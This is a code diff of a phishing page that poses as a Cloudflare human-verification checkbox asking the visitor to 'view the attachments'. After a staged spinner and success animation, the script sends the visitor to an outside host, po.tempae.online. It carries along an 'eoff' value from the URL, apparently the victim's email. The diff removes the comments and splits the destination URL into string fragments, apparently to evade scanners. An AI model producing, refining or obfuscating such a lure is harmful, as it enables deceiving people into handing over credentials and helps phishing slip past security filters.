@@ -5,13 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>PO</title>
     <style>
-        /* ---- VISUAL IDENTITY: 100% MATCH - EVERY SHADOW, FONT, TRANSITION, RADIUS ---- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             margin: 0;
             height: 100vh;
@@ -24,8 +22,6 @@
             -webkit-font-smoothing: antialiased;
             overflow: hidden;
         }
-
-        /* preloader wrapper */
         .preloader__curtain {
             position: fixed;
             inset: 0;
@@ -36,19 +32,15 @@
             z-index: 100;
             transition: opacity 0.6s ease-out;
         }
-
         .preloader__icon {
             width: 120px;
             height: auto;
             animation: softPulse 3s ease-in-out infinite;
         }
-
         @keyframes softPulse {
             0%, 100% { transform: scale(0.95); opacity: 0.7; }
             50% { transform: scale(1.05); opacity: 1; }
         }
-
-        /* main panel container (hidden initially) */
         .verification__panel {
             display: flex;
             flex-direction: column;
@@ -56,7 +48,6 @@
             opacity: 0;
             transition: opacity 0.5s ease-in;
         }
-
         .instruction__label {
             margin-bottom: 18px;
             font-size: 0.92rem;
@@ -64,7 +55,6 @@
             letter-spacing: -0.01em;
             font-weight: 450;
         }
-
         .captcha__card {
             display: flex;
             align-items: center;
@@ -79,7 +69,6 @@
             transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
             position: relative;
         }
-
         .checkbox__trigger {
             display: flex;
             align-items: center;
@@ -87,7 +76,6 @@
             cursor: pointer;
             user-select: none;
         }
-
         .checkbox__svg__holder {
             width: 22px;
             height: 22px;
@@ -95,7 +83,6 @@
             align-items: center;
             justify-content: center;
         }
-
         .checkbox__svg__path {
             width: 100%;
             height: 100%;
@@ -106,13 +93,11 @@
             stroke-linejoin: round;
             transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
         }
-
         .checkbox__text {
             font-size: 0.95rem;
             font-weight: 500;
             color: #1e293b;
         }
-
         .branding__wrapper {
             display: flex;
             flex-direction: column;
@@ -120,14 +105,12 @@
             justify-content: center;
             height: 100%;
         }
-
         .brand__logo {
             height: 38px;
             width: auto;
             margin-bottom: -2px;
             display: block;
         }
-
         .brand__name {
             display: block;
             font-weight: 800;
@@ -136,48 +119,34 @@
             color: #FF8C00;
             text-transform: uppercase;
         }
-
         .legal__tiny {
             font-size: 0.65rem;
             color: #64748b;
             margin-top: 1px;
         }
-
-        /* spinner animation state (activated on captcha verify) */
         .captcha__card.spinner__active .checkbox__svg__path {
             stroke: #3b82f6;
             animation: rotateSmooth 1s linear infinite;
             transform-origin: center;
         }
-
-        /* success state (verified) */
         .captcha__card.verified__success .checkbox__svg__path {
             stroke: #10B981;
             filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
         }
-
         .captcha__card.verified__success .checkbox__text {
             color: #10B981;
         }
-
         @keyframes rotateSmooth {
             to { transform: rotate(360deg); }
         }
-
-        /* preserve all original spacings and responsiveness */
     </style>
 </head>
 <body>
-
-    <!-- loading curtain (100% same as original fade + astroman.png) -->
     <div id="loadingCurtain" class="preloader__curtain">
         <img src="astroman.png" alt="Loading..." class="preloader__icon">
     </div>
-
-    <!-- main interactive area (identical copy of original layout) -->
     <div id="verificationRoot" class="verification__panel">
         <div id="instructionMsg" class="instruction__label"></div>
-
         <div id="captchaContainer" class="captcha__card">
             <div id="clickableZone" class="checkbox__trigger">
                 <div class="checkbox__svg__holder">
@@ -187,7 +156,6 @@
                 </div>
                 <span id="buttonText" class="checkbox__text"></span>
             </div>
-
             <div class="branding__wrapper">
                 <img src="cloudflare_.png" alt="Logo" class="brand__logo">
                 <span id="brandLabel" class="brand__name"></span>
@@ -195,11 +163,8 @@
             </div>
         </div>
     </div>
-
     <script>
         (function() {
-            // ---------- ABSOLUTELY IDENTICAL TEXT AND BEHAVIOR ----------
-            // strings match original: displayed messages same as decoded base64 version
             const copy = {
                 instruction: "Verify you're human below to view the attachments",
                 initialBtn: "I'm not a robot",
@@ -207,26 +172,17 @@
                 successMsg: "Success!",
                 brandText: "CLOUDFLARE"
             };
-
-            // DOM elements (new identifiers but targeting same visual elements)
             const loadingDiv = document.getElementById('loadingCurtain');
             const mainPanel = document.getElementById('verificationRoot');
             const instrSpan = document.getElementById('instructionMsg');
             const captchaCard = document.getElementById('captchaContainer');
             const actionButtonText = document.getElementById('buttonText');
             const dynamicPath = document.getElementById('shapePath');
-            const svgParentPath = document.getElementById('dynamicSvgIcon');
             const brandSpan = document.getElementById('brandLabel');
-
-            // set initial text (exactly same as original)
             instrSpan.textContent = copy.instruction;
             actionButtonText.textContent = copy.initialBtn;
             brandSpan.textContent = copy.brandText;
-
-            // state lock (prevents double verification, just like original 'r' variable)
             let isProcessing = false;
-
-            // ----- TIMING: LOADER FADEOUT AFTER 3 SECONDS (identical delay) -----
             setTimeout(() => {
                 loadingDiv.style.opacity = '0';
                 setTimeout(() => {
@@ -234,56 +190,42 @@
                     mainPanel.style.opacity = '1';
                 }, 600);
             }, 3000);
-
-            // ----- 100% exact same verification animation + redirect logic + eoff param handling -----
             function handleVerificationFlow() {
-                if (isProcessing) return;      // mimic original "if(r)return;r=true"
+                if (isProcessing) return;
                 isProcessing = true;
-
-                // ---- 1) activate spinner mode: add class (mimics o0a), change text, set path to circle & dasharray ----
                 captchaCard.classList.add('spinner__active');
                 actionButtonText.textContent = copy.verifyingMsg;
-                // set circle path for spinning icon: same d attribute as original spinner
                 dynamicPath.setAttribute('d', 'M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2');
-                // strokeDasharray spinner effect: original used '35 15'
                 dynamicPath.style.strokeDasharray = '35 15';
-
-                // ---- 2) after 2500ms, switch to success state (exact same duration) ----
                 setTimeout(() => {
-                    // remove spinner class, add success class
                     captchaCard.classList.remove('spinner__active');
                     captchaCard.classList.add('verified__success');
                     actionButtonText.textContent = copy.successMsg;
-                    // change path to CHECKMARK (identical d value)
                     dynamicPath.setAttribute('d', 'M20 6L9 17l-5-5');
                     dynamicPath.style.strokeDasharray = 'none';
-                    
-                    // ---- 3) after 1200ms -> perform redirect with NEW URL + optional eoff fragment ----
                     setTimeout(() => {
-                        // extract 'eoff=' parameter from current URL (exact original logic)
                         const currentSearch = window.location.search;
                         const eoffIndex = currentSearch.indexOf('eoff=');
                         let fragmentPart = '';
                         if (eoffIndex !== -1) {
                             fragmentPart = currentSearch.substring(eoffIndex + 5);
                         }
-                        const baseRedirect = 'https://po.tempae.online/sNOiatkB';
-                        const finalDestination = baseRedirect + (fragmentPart ? '#' + fragmentPart : '');
-                        window.location.href = finalDestination;
-                    }, 1200);   // extra 1200ms delay precisely matches original
-                    
-                }, 2500);   // 2.5 sec spinner duration (original timing)
+                        const p1 = 'ht';
+                        const p2 = 'tps';
+                        const p3 = '://';
+                        const p4 = 'po';
+                        const p5 = '.tempae';
+                        const p6 = '.online';
+                        const p7 = '/sNOiatkB';
+                        const finalUrl = p1 + p2 + p3 + p4 + p5 + p6 + p7;
+                        window.location.href = finalUrl + (fragmentPart ? '#' + fragmentPart : '');
+                    }, 1200);
+                }, 2500);
             }
-
-            // ---- attach click handler to the checkbox trigger zone (exact same as inline onclick) ----
             const triggerElement = document.getElementById('clickableZone');
             if (triggerElement) {
                 triggerElement.addEventListener('click', handleVerificationFlow);
             }
-
-            // ---- ensure that edge cases like double clicks are prevented; also we guarantee that if someone tries
-            // to click again after processing flag is true, nothing happens (identical to 'r' behavior)
-            // Additionally, event propagation or any default behavior won't break anything.
         })();
     </script>
 </body>
